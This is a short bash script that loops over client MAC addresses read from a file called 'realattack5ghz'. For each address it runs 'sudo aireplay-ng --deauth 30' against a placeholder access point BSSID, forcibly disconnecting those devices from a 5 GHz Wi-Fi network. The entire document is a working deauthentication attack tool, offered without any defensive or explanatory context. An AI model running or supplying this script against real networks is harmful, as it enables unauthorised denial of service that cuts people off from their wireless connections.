#!/bin/bash

BSSID5="00:00:00:00:00:00"
GHZ5=adapter



for deauth in $(cat realattack5ghz); do
if [[ $deauth = "< | HWaddress" ]]; then
	echo ""
else
sudo aireplay-ng -D --deauth 30 -a $BSSID5 -c $deauth $GHZ5
fi
done

